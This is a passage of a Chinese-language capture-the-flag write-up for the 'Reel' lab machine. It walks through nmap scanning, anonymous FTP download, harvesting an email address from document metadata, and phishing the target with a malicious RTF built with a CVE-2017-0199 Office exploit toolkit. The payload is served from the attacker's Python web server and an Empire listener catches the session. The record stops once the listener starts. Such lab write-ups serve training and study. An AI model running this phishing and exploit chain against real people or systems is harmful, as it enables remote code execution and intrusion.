# Reel
靶机地址：  
nmap -v -A -sV -sC 10.10.10.77  
这是一台server2012 R2，有ssh、ftp、smtp服务，Active Directory域服务。  
扫描出来的信息里面，可以看到ftp匿名登陆。
    PORT      STATE SERVICE      VERSION
    21/tcp    open  ftp          Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_05-28-18  11:19PM                 documents
    | ftp-syst: 
    |_  SYST: Windows_NT
    22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
    |   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
    |_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
    25/tcp    open  smtp?
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
    |     220 Mail Service ready
    |   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
    |     220 Mail Service ready
    |     sequence of commands
    |     sequence of commands
    |   Hello: 
    |     220 Mail Service ready
    |     EHLO Invalid domain address.
    |   Help: 
    |     220 Mail Service ready
    |     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
    |   SIPOptions: 
    |     220 Mail Service ready
    |     sequence of commands
    |_    sequence of commands
    | smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
    |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
    593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
    49159/tcp open  msrpc        Microsoft Windows RPC
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?
    Host script results:
    |_clock-skew: mean: -47s, deviation: 2s, median: -49s
    | smb-os-discovery: 
    |   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
    |   OS CPE: cpe:/o:microsoft:windows_server_2012::-    |   Computer name: REEL
    |   NetBIOS computer name: REEL\x00
    |   Domain name: HTB.LOCAL
    |   Forest name: HTB.LOCAL
    |   FQDN: REEL.HTB.LOCAL
    |_  System time: 2019-01-21T03:35:22+00:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: required
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2019-01-21 11:35:20
    |_  start_date: 2019-01-21 07:54:45
使用ftp匿名登陆，然后mget *下载里面的内容，一共三个文件AppLocker.docx、readme.txt、Forwarding.docx
    $ ftp
    ftp> open
    (to) 10.10.10.77
    Connected to 10.10.10.77.
    220 Microsoft FTP Service
    Name (10.10.10.77:Rogerd): Anonymous 
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password:
    230 User logged in.
    Remote system type is Windows_NT.
    ftp> dir
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    05-28-18  11:19PM                 documents
    ftp> cd documents
    250 CWD command successful.
    ftp> mget *
    mget AppLocker.docx? 
    200 PORT command successful.
cat readme.txt  
让我们构造一个rtf的邮件。  
那我们还要找到一个邮件地址。
    please email me any rtf format procedures - I'll review and convert.
    new format / converted documents will be saved here.%
查看其他两个word文档，其中一个无法直接打开，我们查看一些相关信息。  
可以看到一个邮箱  
exiftool Windows\ Event\ Forwarding.docx
    ExifTool Version Number         : 11.16
    File Name                       : Windows Event Forwarding.docx
    Directory                       : .
    File Size                       : 14 kB
    File Modification Date/Time     : 2019:01:21 12:01:36+08:00
    File Access Date/Time           : 2019:01:21 13:00:24+08:00
    File Inode Change Date/Time     : 2019:01:21 12:01:36+08:00
    File Permissions                : rw-r--r--    File Type                       : DOCX
    File Type Extension             : docx
    MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
    Zip Required Version            : 20
    Zip Bit Flag                    : 0x0006
    Zip Compression                 : Deflated
    Zip Modify Date                 : 1980:01:01 00:00:00
    Zip CRC                         : 0x82872409
    Zip Compressed Size             : 385
    Zip Uncompressed Size           : 1422
    Zip File Name                   : [Content_Types].xml
    Creator                         : PI:EMAIL
打开AppLocker.docx  
已启用，哈希规则对可执行文件，MSI和脚本（.ps1，.vbs，.cmd，.bat）有效
    AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
我们 尝试发送给PI:EMAIL ,并监听一个端口看是否有返回信息。  
我们使用Exploit toolkit CVE-2017-0199 Microsoft Office RCE。它可以生成恶意RTF / PPSX文件  
使用python监听
> python -m SimpleHTTPServer 8000
使用python脚本CVE-2017-0199生成RTF，发送到指定邮箱
> python cve-2017-0199_toolkit.py -M gen -t RTF -w TEST.RTF -u
> 
使用sendEmail发送邮件
> sendEmail -f PI:EMAIL -t PI:EMAIL -u RTF -m 'open file!'
> -a TEST.RTF -s 10.10.10.77
可以看到成功访问到8000端口  
Empire是一个用于管理powershell会话的工具  
我们使用Empire生成hta，然后通过发送到指定邮箱，使用python运行服务，把hta放在tmp文件下，接收方执行TEST.RTF就会远程访问我们提前生成好放在tmp文件夹下的hta文件。
    (Empire) > listeners
    (Empire: listeners) > uselistener http
    (Empire: listeners/http) > set Host http://10.10.10.14.19
    (Empire: listeners/http) > execute
    [*] Starting listener 'http'
     * Serving Flask app "http" (lazy loading)
     * Environment: production
       WARNING: Do not use the development server in a production environment.
       Use a production WSGI server instead.
     * Debug mode: off
    [+] Listener successfully started!